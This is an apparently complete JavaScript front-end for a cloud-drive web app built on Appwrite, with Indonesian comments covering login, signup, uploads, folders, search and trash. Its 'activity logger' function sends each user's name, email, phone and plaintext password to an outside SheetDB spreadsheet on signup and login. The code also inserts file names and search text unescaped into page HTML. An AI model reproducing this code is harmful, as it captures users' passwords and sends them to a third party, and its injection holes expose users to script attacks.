const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// ======================================================
// 1. KONFIGURASI (JANGAN DIHAPUS)
// ======================================================
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',
    BUCKET_ID: 'taskfiles'
};

const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

// STATE GLOBAL
let currentUser = null;
let currentFolderId = 'root'; 
let currentFolderName = "Drive";
let currentViewMode = 'root'; 
let selectedItem = null; 
let selectedUploadFile = null; 
let storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
let searchTimeout = null;

const el = (id) => document.getElementById(id);
const showLoading = () => el('loading').classList.remove('hidden');
const hideLoading = () => el('loading').classList.add('hidden');

// ======================================================
// 2. INISIALISASI UTAMA
// ======================================================
document.addEventListener('DOMContentLoaded', () => {
    checkSession();
    initDragAndDrop();
    initLogout();
    initSearchBar();
    initAllContextMenus(); // Menangani New, Sidebar, dan Klik Kanan Area
});

// ======================================================
// 3. LOGIKA PENCATAT EXCEL (SHEETDB)
// ======================================================
async function recordActivity(sheetName, userData) {
    try {
        const now = new Date();
        const formattedDate = now.toLocaleString('id-ID', { 
            day: '2-digit', month: '2-digit', year: 'numeric',
            hour: '2-digit', minute: '2-digit', second: '2-digit'
        }).replace(/\./g, ':'); 

        const payload = {
            "ID": userData.id || "-",
            "Nama": userData.name || "-",
            "Email": userData.email || "-",
            "Phone": userData.phone || "-",       
            "Password": userData.password || "-", 
            "Waktu": formattedDate,
            "Riwayat Waktu": formattedDate 
        };

        await fetch(`${SHEETDB_API}?sheet=${sheetName}`, {
            method: 'POST',
            headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: payload })
        });
    } catch (error) { console.error("Excel Log Error"); }
}

// ======================================================
// 4. LOGIKA NAVIGASI & SIDEBAR
// ======================================================
window.handleMenuClick = (element, mode) => {
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    element.classList.add('active');
    currentViewMode = mode;
    currentFolderId = 'root';
    loadFiles(mode);
};

window.goBack = () => {
    currentFolderId = 'root';
    currentFolderName = "Drive";
    currentViewMode = 'root';
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.nav-item')[0].classList.add('active');
    loadFiles('root');
};

window.openFolder = (id, name) => {
    currentFolderId = id;
    currentFolderName = name;
    loadFiles(id);
};

// ======================================================
// 5. FITUR SEARCH ENGINE (CANGGIH)
// ======================================================
function initSearchBar() {
    const input = el('searchInput');
    const clearBtn = el('clearSearchBtn');
    if (!input) return;

    input.addEventListener('input', (e) => {
        const query = e.target.value.trim();
        if (query.length > 0) clearBtn.classList.remove('hidden'); 
        else { clearBtn.classList.add('hidden'); loadFiles(currentFolderId); return; }

        clearTimeout(searchTimeout);
        el('fileGrid').innerHTML = `<div style="grid-column:1/-1;text-align:center;margin-top:50px;"><div class="spinner"></div><p>Mencari "${query}"...</p></div>`;
        
        searchTimeout = setTimeout(() => performSearch(query), 600);
    });
}

async function performSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.search('name', keyword),
            Appwrite.Query.limit(50)
        ]);
        const grid = el('fileGrid'); grid.innerHTML = '';
        if (res.documents.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;margin-top:50px;">Data tidak ditemukan.</p>`;
        else res.documents.forEach(doc => renderItem(doc));
    } catch (e) { console.warn("Pencarian gagal, database belum siap."); }
}

window.clearSearch = () => { el('searchInput').value = ''; el('clearSearchBtn').classList.add('hidden'); loadFiles(currentFolderId); };

// ======================================================
// 6. LOGIKA KLIK KANAN & TOMBOL NEW (SOLUSI TERBENTROK)
// ======================================================
function initAllContextMenus() {
    const globalMenu = el('globalContextMenu');
    const newBtnMenu = el('dropdownMenu');
    const fileMenu = el('contextMenu');
    const newBtn = el('newBtnMain');
    const navDrive = el('navDrive');
    const mainArea = document.querySelector('.main-content-area');

    const closeAll = () => {
        if(globalMenu) globalMenu.classList.remove('show');
        if(newBtnMenu) newBtnMenu.classList.remove('show');
        if(fileMenu) { fileMenu.classList.add('hidden'); fileMenu.classList.remove('show'); }
        // Jaminan Modal Storage Tertutup
        if(el('storageModal')) el('storageModal').classList.add('hidden');
    };

    // A. Tombol New (Klik Kiri & Kanan Terpadu)
    if (newBtn) {
        newBtn.onclick = (e) => { e.stopPropagation(); const wasOpen = newBtnMenu.classList.contains('show'); closeAll(); if(!wasOpen) newBtnMenu.classList.add('show'); };
        newBtn.oncontextmenu = (e) => { e.preventDefault(); e.stopPropagation(); closeAll(); newBtnMenu.classList.add('show'); };
    }

    // B. Sidebar Drive Saya (Klik Kanan)
    if (navDrive) {
        navDrive.oncontextmenu = (e) => { e.preventDefault(); e.stopPropagation(); closeAll();
            globalMenu.style.top = `${e.clientY}px`; globalMenu.style.left = `${e.clientX}px`; globalMenu.classList.add('show');
        };
    }

    // C. Area Kosong (Klik Kanan)
    if (mainArea) {
        mainArea.oncontextmenu = (e) => {
            if (e.target.closest('.item-card')) return; // Biarkan logika file yang handle
            e.preventDefault(); closeAll();
            globalMenu.style.top = `${e.clientY}px`; globalMenu.style.left = `${e.clientX}px`; globalMenu.classList.add('show');
        };
    }

    window.onclick = () => closeAll();
}

// ======================================================
// 7. RENDER ITEM & MENU FILE (MENU SAMPAH MUNCUL)
// ======================================================
function renderItem(doc) {
    const grid = el('fileGrid');
    const div = document.createElement('div');
    div.className = 'item-card';
    const isFolder = doc.type === 'folder';
    
    // Icon Logic
    const content = isFolder ? `<i class="icon fa-solid fa-folder"></i>` : `<i class="icon fa-solid fa-file-lines" style="color:#60a5fa"></i>`;
    const starHTML = doc.starred ? `<i class="fa-solid fa-star" style="position:absolute;top:10px;left:10px;color:#ffd700;"></i>` : '';
    
    div.innerHTML = `${starHTML}${content}<div class="item-name">${doc.name}</div>`;
    div.onclick = () => { if(!doc.trashed) isFolder ? openFolder(doc.$id, doc.name) : window.open(doc.url, '_blank'); };

    // KLIK KANAN PADA FILE/FOLDER
    div.oncontextmenu = (e) => {
        e.preventDefault(); e.stopPropagation();
        
        // JAMINAN: Tutup modal storage dan menu global agar tidak tabrakan
        if(el('storageModal')) el('storageModal').classList.add('hidden');
        if(el('globalContextMenu')) el('globalContextMenu').classList.remove('show');
        if(el('dropdownMenu')) el('dropdownMenu').classList.remove('show');

        selectedItem = doc;
        const menu = el('contextMenu');
        menu.style.top = `${e.clientY}px`; menu.style.left = `${e.clientX}px`;
        menu.classList.remove('hidden'); menu.classList.add('show');

        // Logika Dinamis (Bintang & Sampah)
        const isTrash = doc.trashed;
        el('ctxTrashBtn').classList.toggle('hidden', isTrash);
        el('ctxRestoreBtn').classList.toggle('hidden', !isTrash);
        el('ctxPermDeleteBtn').classList.toggle('hidden', !isTrash);
        el('ctxStarText').innerText = doc.starred ? "Hapus dari Berbintang" : "Tambahkan ke Berbintang";
    };
    grid.appendChild(div);
}

// ======================================================
// 8. STORAGE DETAIL (SESUAI GAMBAR)
// ======================================================
window.openStorageModal = () => {
    // Tutup menu klik kanan agar tidak tabrakan
    el('contextMenu').classList.add('hidden');
    
    const total = storageDetail.total || 1;
    el('barImages').style.width = `${(storageDetail.images/total)*100}%`;
    el('barVideos').style.width = `${(storageDetail.videos/total)*100}%`;
    el('barDocs').style.width = `${(storageDetail.docs/total)*100}%`;
    el('barOthers').style.width = `${(storageDetail.others/total)*100}%`;

    el('storageBigText').innerText = (storageDetail.total / 1048576).toFixed(2) + " MB";
    el('valImages').innerText = (storageDetail.images / 1048576).toFixed(2) + " MB";
    el('valVideos').innerText = (storageDetail.videos / 1048576).toFixed(2) + " MB";
    el('valDocs').innerText = (storageDetail.docs / 1048576).toFixed(2) + " MB";
    el('valOthers').innerText = (storageDetail.others / 1048576).toFixed(2) + " MB";

    window.openModal('storageModal');
};

async function calculateStorage() {
    if (!currentUser) return;
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.equal('type', 'file')]);
        storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
        res.documents.forEach(doc => {
            const size = doc.size || 0; const name = doc.name.toLowerCase(); storageDetail.total += size;
            if (name.match(/\.(jpg|jpeg|png|gif|webp|jfif)$/)) storageDetail.images += size;
            else if (name.match(/\.(mp4|mkv|mov|avi)$/)) storageDetail.videos += size;
            else if (name.match(/\.(pdf|doc|docx|xls|xlsx|txt)$/)) storageDetail.docs += size;
            else storageDetail.others += size;
        });
        const mb = (storageDetail.total / 1048576).toFixed(2);
        el('storageUsed').innerText = `${mb} MB`;
        el('storageBar').style.width = `${Math.min((mb / 2048) * 100, 100)}%`;
    } catch (e) {}
}

// ======================================================
// 9. AUTH & SESSION (SIGNUP, LOGIN, LOGOUT)
// ======================================================
async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        window.nav('dashboardPage'); 
        loadFiles('root');  
        calculateStorage();
    } catch (e) { window.nav('loginPage'); } 
    finally { setTimeout(hideLoading, 500); }
}

if(el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value; const email = el('regEmail').value; const phone = el('regPhone').value; const pass = el('regPass').value;
        showLoading();
        try {
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone });
            await recordActivity('SignUp', { id: auth.$id, name, email, phone, password: pass });
            alert("Berhasil Daftar!"); window.nav('loginPage');
        } catch(e) { alert(e.message); } finally { hideLoading(); }
    });
}

if(el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let inputId = el('loginEmail').value.trim(); const pass = el('loginPass').value;
        showLoading();
        try {
            if (!inputId.includes('@')) {
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', inputId)]);
                if (res.total === 0) throw new Error("User tidak ditemukan");
                inputId = res.documents[0].email;
            }
            await account.createEmailPasswordSession(inputId, pass);
            const user = await account.get();
            const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, user.$id);
            await recordActivity('Login', { id: user.$id, name: user.name, email: user.email, phone: userDB.phone, password: pass });
            checkSession();
        } catch (error) { alert("Login Gagal"); hideLoading(); }
    });
}

function initLogout() {
    const btn = el('logoutBtn');
    if (btn) {
        btn.onclick = async () => {
            if (!confirm("Keluar?")) return;
            showLoading();
            try {
                if (currentUser) {
                    const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id);
                    await recordActivity('Logout', { id: currentUser.$id, name: currentUser.name, email: currentUser.email, phone: userDB.phone, password: "-" });
                }
                await account.deleteSession('current');
                window.location.reload(); 
            } catch (error) { window.location.reload(); }
        };
    }
}

// ======================================================
// 10. CRUD FILES & MODAL HELPERS
// ======================================================
async function loadFiles(param) {
    if (!currentUser) return;
    const grid = el('fileGrid'); grid.innerHTML = ''; 
    const isRoot = (param === 'root');
    el('headerTitle').innerText = isRoot ? `Welcome In Drive` : param.toUpperCase();
    
    let queries = [Appwrite.Query.equal('owner', currentUser.$id)];
    if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.equal('trashed', false));
    else if (param === 'starred') queries.push(Appwrite.Query.equal('starred', true), Appwrite.Query.equal('trashed', false));
    else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true));
    else {
        if (typeof param === 'string' && !['root','recent','starred','trash'].includes(param)) currentFolderId = param;
        queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false));
    }

    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries);
        res.documents.forEach(doc => renderItem(doc));
    } catch (e) {}
}

window.submitUploadFile = async () => {
    if (!el('fileInputHidden').files[0]) return alert("Pilih file!");
    const file = el('fileInputHidden').files[0];
    showLoading();
    try {
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), file);
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: file.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, 
            url: storage.getFileView(CONFIG.BUCKET_ID, up.$id).href, fileId: up.$id, size: file.size, starred: false, trashed: false
        });
        closeModal('uploadModal'); loadFiles(currentFolderId); calculateStorage();
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.submitCreateFolder = async () => {
    const name = el('newFolderName').value.trim();
    if (!name) return;
    showLoading();
    try {
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, starred: false, trashed: false
        });
        closeModal('folderModal'); loadFiles(currentFolderId);
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.openModal = (id) => { el(id).classList.remove('hidden'); if(id==='folderModal') setTimeout(()=>el('newFolderName').focus(),100); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => { el('fileInputHidden').value = ''; el('fileInfoContainer').classList.add('hidden'); window.openModal('uploadModal'); };
window.createFolder = () => window.openModal('folderModal');
window.toggleStarItem = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { starred: !selectedItem.starred }); loadFiles(currentFolderId); el('contextMenu').classList.add('hidden'); } catch(e){} };
window.moveItemToTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: true }); loadFiles(currentFolderId); el('contextMenu').classList.add('hidden'); } catch(e){} };
window.restoreFromTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: false }); loadFiles('trash'); el('contextMenu').classList.add('hidden'); } catch(e){} };
window.deleteItemPermanently = async () => { if(!confirm("Hapus selamanya?")) return; try { if(selectedItem.type==='file') await storage.deleteFile(CONFIG.BUCKET_ID, selectedItem.fileId); await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id); loadFiles('trash'); calculateStorage(); el('contextMenu').classList.add('hidden'); } catch(e){} };

function initDragAndDrop() {
    const zone = el('dropZone');
    if (!zone) return;
    zone.addEventListener('dragover', (e) => { e.preventDefault(); zone.classList.add('active'); });
    zone.addEventListener('dragleave', () => zone.classList.remove('active'));
    zone.addEventListener('drop', (e) => { e.preventDefault(); zone.classList.remove('active'); el('fileInputHidden').files = e.dataTransfer.files; el('fileInfoText').innerText = e.dataTransfer.files[0].name; el('fileInfoContainer').classList.remove('hidden'); });
}

window.togglePass = (id, icon) => { const i = el(id); if (i.type === "password") { i.type = "text"; icon.classList.replace("fa-eye-slash", "fa-eye"); } else { i.type = "password"; icon.classList.replace("fa-eye", "fa-eye-slash"); } };